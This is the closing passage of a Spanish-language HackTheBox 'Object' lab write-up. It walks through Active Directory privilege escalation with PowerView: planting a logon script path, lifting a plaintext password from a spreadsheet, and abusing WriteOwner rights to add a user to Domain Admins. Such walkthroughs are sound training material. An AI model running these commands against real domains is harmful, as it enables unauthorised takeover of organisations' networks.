</pre><td class="rouge-code"><pre><span class="n">Set-ADObject</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-PropertyName</span><span class="w"> </span><span class="nx">scriptpath</span><span class="w"> </span><span class="nt">-PropertyValue</span><span class="w"> </span><span class="s2">"C:\Temp\Scripts\pwn.ps1"</span><span class="w">
</span></pre></table></code></div></div><ul><li>Verificaremos que se agregó correctamente.</ul><p><img data-src="/images/HTB/Object/155-import-powerview.png" alt="" data-proofer-ignore></p><h2 id="enumeración-de-directorio"><span class="mr-2">Enumeración de directorio</span><a href="#enumeración-de-directorio" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Al cabo de unos segundos veremos el archivo <strong>out.txt</strong> con el output del comando <code class="language-plaintext highlighter-rouge">dir C:\Users\maria\Desktop</code>.</p><p><img data-src="/images/HTB/Object/157-script-out.png" alt="" data-proofer-ignore></p><p>Vemos el archivo <strong>Engines.xls</strong>, la idea será traerlo a nuestra máquina para inspeccionarlo. Para esto podemos convertirlo a <strong>base64</strong> y extraerlo, o bien, copiarlo a nuestra carpeta temporal y luego descargarlo.</p><p><img data-src="/images/HTB/Object/159-download-engines.png" alt="" data-proofer-ignore></p><h2 id="credenciales"><span class="mr-2">Credenciales</span><a href="#credenciales" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Abremos el archivo y veremos tres posibles credenciales.</p><p><img data-src="/images/HTB/Object/161-engines-content.png" alt="" data-proofer-ignore></p><p>Luego de validar las contraseñas contra <strong>WinRM</strong>, verificamos que <code class="language-plaintext highlighter-rouge">W3llcr4ft3d_4cls</code> es la correcta para <strong>maria</strong>.</p><p><img data-src="/images/HTB/Object/165-shell-as-maria.png" alt="" data-proofer-ignore></p><hr /><h1 id="domain-admin">Domain Admin</h1><p>Ya que tenemos acceso como <strong>maria</strong>, sólo restaría abusar del ACL <code class="language-plaintext highlighter-rouge">WriteOwner</code> para obtener <strong>Domain Admin</strong>.</p><p><img data-src="/images/HTB/Object/167-maria-to-domain.png" alt="" data-proofer-ignore></p><p>Volveremos al directorio temporal creado anteriormente y haremos lo siguiente:</p><ul><li>Importar nuevamente PowerView.ps1.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span></pre></table></code></div></div><ul><li>Setear <strong>maria</strong> como propietario del grupo <strong>Domain Admins</strong>.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-DomainObjectOwner</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nt">-OwnerIdentity</span><span class="w"> </span><span class="nx">maria</span><span class="w">
</span></pre></table></code></div></div><ul><li>Garantizar todos los permisos a <strong>maria</strong> dentro del grupo <strong>Domain Admins</strong>.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">All</span><span class="w">
</span></pre></table></code></div></div><ul><li>Finalmente agregar a <strong>maria</strong> dentro del grupo Domain Admins.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nx">maria</span><span class="w"> </span><span class="nx">/add</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="/images/HTB/Object/169-maria-domain-admin.png" alt="" data-proofer-ignore></p><p>Ya en este punto tendríamos los privlegios máximos y estaría rooteada la máquina.</p><blockquote><p><strong>Nota:</strong> Recordar que es necesario reiniciar la sesión para que se apliquen los nuevos permisos.</p></blockquote><p>Como último paso buscaremos las flags.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Users</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="nx">root.txt</span><span class="p">,</span><span class="nx">user.txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Fullname</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="/images/HTB/Object/170-flags.png" alt="" data-proofer-ignore></p><p>Esto sería todo para <a href="https://app.hackthebox.com/machines/Object">Object</a>.</p><p><img data-src="/images/HTB/Object/200-pwned.png" alt="" data-proofer-ignore></p><blockquote><p>¡Happy Hacking and keep grinding!</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hard/" class="post-tag no-text-decoration" >hard</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >active-directory</a> <a href="/tags/jenkins/" class="post-tag no-text-decoration" >jenkins</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Object Writeup [ES] - HackTheBox - brsalcedom&amp;url=https://brsalcedom.github.io/Object-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Object Writeup [ES] - HackTheBox - brsalcedom&amp;u=https://brsalcedom.github.io/Object-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://brsalcedom.github.io/Object-Writeup-HackTheBox/&amp;text=Object Writeup [ES] - HackTheBox - brsalcedom" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/Active-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1642640400" > 2022-01-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Active es una máquina Windows de dificultad fácil ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un paso a paso de su resolución. Resumen Esta máquina trata conce...</p></div></div></a></div><div class="card"> <a href="/Sauna-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1644076800" > 2022-02-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Sauna Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Resumen Sauna es una máquina Windows de dificultad fácil de la plataforma de Hack The Box, incluye conceptos de explotación de Active Directory y enumeración básica. Comenzaremos por encontrar us...</p></div></div></a></div><div class="card"> <a href="/Monteverde-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1645027200" > 2022-02-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Monteverde Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Resumen Monteverde es una máquina Windows de dificultad media de la plataforma de Hack The Box, incluye conceptos de explotación de Azure AD Sync y enumeración básica. Se iniciará obteniendo info...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Monteverde-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Older"><p>Monteverde Writeup [ES] - HackTheBox</p></a> <a href="/Buff-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Newer"><p>Buff Writeup [ES] - HackTheBox</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
